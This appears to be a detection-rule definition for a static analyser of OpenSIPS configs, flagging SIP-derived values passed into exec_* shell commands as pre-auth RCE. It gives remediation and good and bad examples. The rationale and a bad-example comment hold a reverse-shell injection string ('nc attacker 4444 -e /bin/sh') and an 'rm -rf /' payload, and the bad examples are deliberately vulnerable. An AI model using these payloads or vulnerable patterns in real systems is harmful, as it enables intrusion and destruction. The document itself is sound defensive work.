---
id: OSIPS-SEC-INJ-003
name: exec-msg-injection
title: SIP-sourced pseudo-variable flows into exec_msg/exec_dset/exec_avp shell command — pre-auth RCE
version: 1.0
engine_version_min: "0.1"
engine_version_max: ""
module_family: injection
applies_if_modules_loaded: [exec]
applies_if_opensips_version: ">=3.2"
phase: [structural, dataflow_taint]
profile: [L1, L2]
automated: true
suppressible: false

severity: critical
confidence: high
security_severity: 9.8
cvss_v4_vector: "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H"
cwe: [CWE-78, CWE-77, CWE-20]
owasp: ["A03:2021-Injection"]
attack: [T1059, T1190]
tags: [injection, command-injection, exec, rce, shell, pre-auth]

references:
  - https://opensips.org/docs/modules/3.4.x/exec.html
  - https://cwe.mitre.org/data/definitions/78.html
  - ../../knowledge/vulnerability-reference.md#section-6

short_description: |
  An attacker-controlled SIP pseudo-variable is interpolated into the command string
  passed to exec_msg(), exec_dset(), or exec_avp(). The exec module forks a shell
  to run the command, so any unescaped metacharacter (semicolon, pipe, backtick,
  $(...), &&, ||) yields pre-authentication remote code execution as the OpenSIPS
  process user — typically with full read/write access to the cfg, secrets, and
  the subscriber DB.
---

## Rationale

The `exec` module forks `/bin/sh -c "<command>"` with the command string assembled by the cfg author. There is no parameterization, no argument-vector form, and no built-in sanitizer transformation comparable to `s.escape.common` for SQL. Any pseudo-variable interpolated into the command string is shell-interpreted: a SIP From username of `1234; nc attacker 4444 -e /bin/sh; #` injects a reverse shell into the spawned subprocess. The result is pre-authentication remote code execution as the OpenSIPS user — and because OpenSIPS commonly runs with read access to its own cfg (which contains `db_url` cleartext credentials, signing keys, and other secrets), the attacker pivots from RCE to full credential disclosure within seconds.

Three structural properties make this the most severe class in the catalog:

1. **No safe interpolation form exists.** Unlike SQLi, there is no OpenSIPS-native escape transformation that produces shell-safe output. Shell metacharacter sets are context-dependent (different inside `$()`, inside backticks, inside double-quotes vs. single-quotes), and a one-size transformation is not part of the module's API.
2. **The sink is RCE by definition.** Even a "harmless" command like `/bin/echo $fU >> /tmp/log` is exploitable — `$fU = "; rm -rf /; #"` interprets as a command list and executes the destructive segment.
3. **OpenSIPS process privileges compound the impact.** Most production deployments run OpenSIPS as a dedicated user with read access to its cfg, write access to its log, and network access to the SIP and DB peers. Post-RCE, the attacker has all of these.

The exec module's documentation explicitly warns about this: every BAD pattern is a script-author footgun, not a module bug. The advisor's stance is therefore strict: any SIP-sourced taint reaching an `exec_*` sink is a critical, non-suppressible finding. The `suppressible: false` flag on this rule reflects that — the documented suppression path is to remove the `exec_*` call or to move the user-derived value out of the command string entirely (not to claim "we sanitized it").

Source: Phase 2 master vulnerability reference §6 (Injection — exec class); OpenSIPS exec module documentation.

## Default Value

Not applicable — the `exec` module has no defaulted command-template behavior. The operator is fully responsible for the command string and any consequences of its interpretation.

## Audit

The rule fires when **any** of the following are true:

1. **Direct interpolation.** A SIP-sourced pseudo-variable (per the taint-source set defined in `OSIPS-SEC-INJECTION-001`) appears literally inside the first-argument command string of `exec_msg()`, `exec_dset()`, `exec_avp()`, or any equivalent module-provided primitive that takes a shell command.
2. **Indirect interpolation via script variable.** A SIP-sourced value is assigned to `$var(*)` or `$avp(*)`, and that variable is then interpolated into the command string. The engine traces these flows.
3. **Argument-position interpolation.** Even when the leading command path is a hardcoded binary (`/usr/local/bin/process-call $fU`), the trailing argument positions are shell-tokenized and a metacharacter-bearing input still injects.

The rule is intentionally aggressive — it fires on the structural pattern (any `exec_*` with a taint-marked variable in the command string) without requiring the engine to prove an attack input exists. Because no safe interpolation form exists, the structural pattern is itself the vulnerability.

A path is exempt only when the command string is provably constant (no PV interpolation of any kind) — e.g., `exec_msg("/usr/local/bin/healthcheck")` with no script-variable interpolation. The engine validates constancy by checking the AST of the string argument; any `$var`/`$avp`/PV reference disqualifies it.

## Remediation

The hierarchy of preferred resolutions:

1. **Eliminate the `exec_*` call.** This is the strongly preferred resolution. The vast majority of `exec_*` use cases in OpenSIPS cfgs can be replaced with module-native alternatives:
   - **Custom DB lookup** → `sqlops:sql_select()` (3.5+) or `avp_db_query()` with `s.escape.common` (3.4 and earlier).
   - **HTTP API call** → `rest_client:rest_get()` / `rest_post()` with explicit URL allow-listing.
   - **Cache read/write** → `cachedb_local`, `cachedb_redis`, etc.
   - **Logging to file** → `acc_db` for accounting; `xlog` for diagnostics; do not invent file-writing via shell.
2. **Move user-derived values out of the command.** If the `exec_*` call is genuinely necessary (e.g., calling a vendor-provided helper script), pass user-derived values via a side channel — write them to a file with a strict 0600 owner-only mode, then have the helper script read from that file with its own validation. The shell command itself becomes constant.
3. **Pre-validate inputs against a strict allow-list.** Only as a defense-in-depth measure on top of (1) or (2), apply a regex check before the `exec_*` call:

   ```opensips
   if (!($var(arg) =~ "^[a-zA-Z0-9_.-]{1,32}$")) {
       send_reply(403, "Forbidden");
       exit;
   }
   ```

   This is *not* sufficient on its own — regex errors are common and the consequence of a permissive regex is RCE. Treat allow-list validation as a backup, not the primary defense.

4. **Rotate any secrets that were on-disk during the vulnerable era.** If the cfg has been deployed with a vulnerable `exec_*` call exposed to the public Internet, assume credential disclosure: rotate `db_url` passwords, JWT signing keys, SIP trunk credentials, and any other secrets readable by the OpenSIPS process user.

## Example — BAD

### Direct $fU interpolation

```opensips
loadmodule "exec.so"

route {
    if (is_method("INVITE")) {
        # Pre-auth RCE: $fU = "x; nc attacker 4444 -e /bin/sh; #"
        exec_msg("/usr/local/bin/process-call $fU $rU");
    }
}
```

### Indirect via script variable

```opensips
route {
    if (is_method("REGISTER")) {
        $var(user) = $fU;
        # Same vulnerability — engine traces the assignment
        exec_avp("/usr/local/bin/log-register $var(user)", "$avp(out)");
    }
}
```

### Apparent constant command, vulnerable argument

```opensips
route {
    if (is_method("INVITE")) {
        # The leading binary is hardcoded but $rU is shell-tokenized as args
        exec_msg("/usr/local/bin/healthcheck $rU");
    }
}
```

## Example — GOOD

### Eliminate exec_*, use sqlops

```opensips
loadmodule "sqlops.so"

modparam("sqlops", "db_url", "ca", "mysql://opensips:secret@db/opensips")

route {
    if (is_method("INVITE")) {
        # Was: exec_msg("/usr/local/bin/lookup-route $fU")
        # Now: parameterized DB lookup, no shell at all
        sql_select("sip_user=$fU", "route_id", "routes", "$var(route)");
    }
}
```

### When exec_* is unavoidable, side-channel the value

```opensips
loadmodule "exec.so"

route {
    if (is_method("INVITE")) {
        # Strict allow-list before any side-channel write
        if (!($fU =~ "^[a-zA-Z0-9_-]{1,32}$")) {
            send_reply(403, "Forbidden");
            exit;
        }

        # Write validated value to a 0600 file the helper script reads
        # (file write mechanism shown conceptually; use file_ops or similar)
        # Helper script then reads from /var/lib/opensips/queue/<fingerprint> safely

        # Command itself is constant — no PV interpolation
        exec_msg("/usr/local/bin/process-queued-calls");
    }
}
```

## Version Notes

The `exec` module API (`exec_msg`, `exec_dset`, `exec_avp`) is stable across OpenSIPS 3.2 through 3.6 with identical signatures. The module is loaded only if the cfg explicitly requests it; configs that do not load `exec.so` are not exposed to this rule's class. The advisor's `applies_if_modules_loaded: [exec]` gate ensures the rule does not fire on cfgs that have eliminated `exec.so` as part of remediation.

## False-Positive Considerations

- **Constant command strings.** `exec_msg("/usr/local/bin/healthcheck")` with no PV interpolation is genuinely safe and the rule does not fire. The advisor verifies constancy at the AST level.
- **Sanitizer regex preceding the call.** Configs that gate the `exec_*` call behind a sufficiently restrictive regex (per the taint-source set's documented restrictiveness threshold) emit at `confidence: medium` rather than `high`. Suppression with `justification="strict allow-list regex applied"` is the documented path. Note that `suppressible: false` in the frontmatter means the operator cannot fully suppress the finding — only downgrade its prominence in the report — because the regex defense is brittle and the residual risk warrants standing review.
- **`exec` loaded but never called.** A cfg that does `loadmodule "exec.so"` without ever invoking an `exec_*` primitive does not fire this rule but does fire `OSIPS-SEC-CONFIG_HYGIENE-002` (module loaded but unused). Remove the load directive.
- **Custom sanitizer functions via `perl` / `python` modules.** If a custom sanitizer is applied, the advisor emits `review_required` rather than firing definitively, and the operator documents the sanitizer's behavior. This is the only path where the suppression mechanism functions in practice — and even then, the residual exposure is documented in the report.

## Related Rules

- `OSIPS-SEC-INJECTION-001` (sql-inj-avp-db-query) — same taint sources, different sink class. SQLi has a defensible remediation path (`s.escape.common` or `sqlops`). Exec injection does not.
- `OSIPS-SEC-INJECTION-004` (exec-setvars) — `exec_avp` and related primitives that write to script variables; same module, different specific failure mode.
- `OSIPS-SEC-CONFIG_HYGIENE-002` — `exec` loaded but unused, a clean-up class.
- `OSIPS-SEC-CONFIG_HYGIENE-004` — `startup_route` running `exec_msg` at process start, which has a different threat model (operator-controlled input) but warrants its own scrutiny.

## Additional References

- Phase 2 master vulnerability reference §6 (Injection — exec class)
- OpenSIPS exec module documentation: https://opensips.org/docs/modules/3.4.x/exec.html
- CWE-78 — Improper Neutralization of Special Elements used in an OS Command (OS Command Injection)
- CWE-77 — Improper Neutralization of Special Elements used in a Command
- CWE-20 — Improper Input Validation
- OWASP A03:2021 — Injection
- MITRE ATT&CK T1059 — Command and Scripting Interpreter
